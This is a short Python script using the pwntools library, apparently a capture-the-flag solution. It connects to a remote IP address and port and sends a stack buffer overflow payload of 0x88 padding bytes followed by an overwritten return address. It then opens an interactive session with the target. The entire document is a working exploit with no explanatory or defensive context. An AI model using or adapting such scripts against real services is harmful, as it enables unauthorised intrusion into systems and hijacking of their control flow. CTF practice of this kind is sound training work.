from pwn import *
sh=remote('111.200.241.244',50726)
payload='a'*(0x80+0x8)+p64(0x400596).decode("iso-8859-1")
sh.sendline(payload)
sh.interactive()